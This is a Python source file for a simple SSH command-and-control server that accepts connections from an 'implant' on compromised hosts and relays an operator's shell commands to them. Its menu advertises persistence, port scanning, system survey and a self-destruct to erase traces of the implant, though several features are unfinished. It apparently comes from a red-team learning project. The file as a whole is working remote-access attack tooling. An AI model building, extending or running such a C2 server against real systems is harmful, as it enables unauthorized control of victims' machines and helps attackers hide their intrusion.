#!/usr/bin/env python3
#Basic python C2 Server
#https://github.com/zweilosec
#based on Joe Helle's video https://www.youtube.com/watch?v=iP7eFbZPgss&list=PLJQHPJLj_SQb0gxh3kCeEurfwPtreQazg
#TODO: https://newbedev.com/creating-multiple-ssh-connections-at-a-time-using-paramiko

import paramiko #ssh library
import argparse
import socket
import os
from colorama import Fore, Style, init
import time
import random
import sys

#Parse arguments from the command line
parser = argparse.ArgumentParser(description='A simple Python SSH C2 Server.')
parser.add_argument('server', help='An IP address or hostname', nargs='?', const=1, default='0.0.0.0')
parser.add_argument('port', help='The port to serve SSH on.', nargs='?', const=1, type=int, default=2222)
parser.add_argument('-i', '--keyfile',help='The ed25519 SSH keyfile to use.', nargs='?', const=1, default='id_ed25519')
parser.add_argument('--keytype', help='The SSH keytype to use [rsa, ed25519]', choices=['rsa','ed25519'], default='ed25519') #TODO
parser.add_argument('-v', '--verbose', action='store_true')
args = parser.parse_args()

#region universal functions
def createStyles():
    global success, informational, warning, fail, normal
    global styles
    success, informational, warning, fail, normal = Fore.GREEN + Style.NORMAL, Fore.CYAN + Style.NORMAL, Fore.YELLOW + Style.DIM, Fore.RED + Style.BRIGHT, Fore.WHITE + Style.NORMAL
    styles = (success, informational, warning, fail, normal)

def verbose_print(to_print):
    if args.verbose:
        print(warning + '[DEBUG] ' + to_print)

def print_banner():
    # print banner one line at a time, in different colors  
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print(random.choice(styles) + line)
#endregion universal functions

#region global variables
BANNER = ''' 
               ____ ____  
  _ __  _   _ / ___|___ \ 
 | '_ \| | | | |     __) |
 | |_) | |_| | |___ / __/ 
 | .__/ \__, |\____|_____|
 |_|    |___/            
         https://github.com/zweilosec
'''

HELP_TEXT = '''

Manage Connections:
::clients             - List connected clients.
::select <id>         - Select a client to send commands.
::kill <id>           - Kill a client connection.

File Transfer:
::download <file>     - Download a file (from client).
::upload <file>       - Upload a file (to client).

Advanced:
::persistence         - Apply persistence mechanism.
::scan <ip>           - Scan top 25 TCP ports on a single host.
::selfdestruct        - Remove all traces of the implant from the target system.
::survey              - Collect system information.

::help                - Show this help menu.

exit -or- quit        - Exit the server and end all client connections.

'''

COMMANDS = [ 'select', 'clients', 'download', 'help', 'kill',
             'persistence', 'scan', 'selfdestruct', 'survey', 'upload']

global CHAN
global CHANNEL
CHAN = []
CHANNEL = 0
#endregion global variables

#region function definitions
def check_command(cmd):
    if cmd[:2] == '::':
        cmd_parse = cmd[2:].lower().split(' ')[0]
        if cmd_parse in COMMANDS:
            run_menuCommand(cmd[2:])
            return True
    else:
        return False

def run_menuCommand(cmd):
    #TODO finish building all commands

    # get base command before operating
    cmd_parse = cmd.lower().split(' ')[0]
    global CHANNEL

    if cmd_parse == 'help':
        print(warning + 'Prefix commands with :: or they will be sent to the remote shell!')
        print(informational + HELP_TEXT)
        print(warning + '** Currently interactive commands do not work and will break your shell! **\n')
        return
    if cmd_parse == 'clients':
        print(informational + 'The current connections are:\n')
        try:
            for i in range(len(CHAN)):
                print(informational + f'Channel {i}: ')
                CHANNEL = i
                send_command('list_me', 0)
            CHANNEL = 0
            print(warning + 'Channel 0 is currently selected.\n')
            return
        except IndexError:
            print(fail + '[Error] List index out of bounds while parsing clients.')
            return
    if cmd_parse == 'kill':
        #TODO need to add a way to keep server up if no CHANNELs open
        #currently crashes if killing CHANNEL 0
        try:
            print(f"Killing Channel {int(cmd.split(' ')[1])}")
            CHANNEL = int(cmd.split(' ')[1])

            print(warning + f'Shutting down Channel {CHANNEL}...')
            send_command('quit')
            print(warning + 'Reverting to Channel 0.')
            CHANNEL = 0
            return
        except IndexError:
            print(fail + "You did not specify a valid Channel!")
            return     
    if cmd_parse == 'select':
        verbose_print("Selecting Channel...")
        try:
            print(f"Selecting Channel {int(cmd.split(' ')[1])}")
            CHANNEL = int(cmd.split(' ')[1])
            return
        except IndexError:
            print(fail + "You did not specify a valid Channel!")
            return

class sshServer (paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            verbose_print('open succeeded')
            return paramiko.OPEN_SUCCEEDED        
        else:
            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        
    def check_auth_password(self, username, password):
        if (username == 'sshuser') and (password == 'sshpass'):
            verbose_print('auth success')
            return paramiko.AUTH_SUCCESSFUL
        else:
            verbose_print('auth failed')
            return paramiko.AUTH_FAILED

def select_client():
    #code to select which connected client to send a command to
    clientID = input('Which client: ')
    #TODO:

def add_listener(server,port,keyfile):
    global CHAN
    global CHANNEL
    cwd = os.getcwd()
    HOSTKEY = paramiko.Ed25519Key(filename=os.path.join(cwd, keyfile))
    #HOSTKEY = paramiko.RSAKey(filename=os.path.join(cwd, 'id_rsa'))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print(informational + 'Listening for connections from implant...')
        client, addr = sock.accept()

    except KeyboardInterrupt:
        print(warning + '\nCtrl-C detected. Exiting...')
        quit()
    
    SSH_SESSION = paramiko.Transport(client)
    SSH_SESSION.add_server_key(HOSTKEY)
    server = sshServer()
    SSH_SESSION.start_server(server=server)
    
    try:
        CHAN.append(SSH_SESSION.accept())
        if CHAN[CHANNEL] is None:
            print(fail + 'Channel error. Exiting.')
            quit()
        verbose_print(f'{CHAN}') #debug check
    except IndexError:
        print(fail + "You did not specify a valid channel, reverting to channel 0.")
        CHANNEL = 0
        return

    success_message = CHAN[CHANNEL].recv(1024).decode()
    print(success + f'{success_message}')
    CHAN[CHANNEL].send('\n') #single byte keep alive

def get_prompt():
    global CHAN
    global CHANNEL
    try:
        CHAN[CHANNEL].send('whoami; hostname; pwd') #not the best way to do this...but works!
        user,hostname,pwd = CHAN[CHANNEL].recv(1024).decode().split() #decode() is necessary to convert bytestream to string
        prompt = (f'({user}@{hostname})-[{pwd}]>') #prompt for shell in format: (username@hostname)-[current/directory]>
        return prompt
    except IndexError:
        print(fail + "You did not specify a valid channel, reverting to channel 0.")
        CHANNEL = 0
        return get_prompt()

def send_command(cmd, color = 4):
    CHAN[CHANNEL].send(cmd)
    return_value = CHAN[CHANNEL].recv(8192)
    style = styles[color]
    print(style + return_value.decode())

def command_handler():
    global CHAN
    global CHANNEL
    try:
        while True:
            verbose_print('Getting Prompt')
            cmd_line = get_prompt()
            
            verbose_print(f'Preparing to receive commands...on {cmd_line}')
            command = input(informational + cmd_line + '' + success) #get user input, displaying the above prompt
            verbose_print(command)
            
            if check_command(command): #checks if the input is a control command or should be sent forward
                continue

            if command in ('exit', 'quit'):
                print(warning + 'Shutting down C2 server...')
                send_command(command, 0)
                quit()            
            if command == '':
                continue
            else:
                send_command(command)
                continue

    except Exception as e:
        print(fail + f'[Error] {str(e)}')
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(fail + f'Exception in {fname}, line: {exc_tb.tb_lineno}, of type {exc_type}.')
        pass
    except KeyboardInterrupt:
        print(warning + '\nCtrl-C detected. Exiting...')
        CHAN[CHANNEL].send('exit')
        return_value = CHAN[CHANNEL].recv(1024)
        print(warning + return_value.decode())
        quit()
#endregion function definitions

# main flow starts here
if __name__ == "__main__":
    init()
    createStyles()
    print_banner()
    add_listener(args.server, args.port, args.keyfile)
    while True:
        get_prompt()
        command_handler()
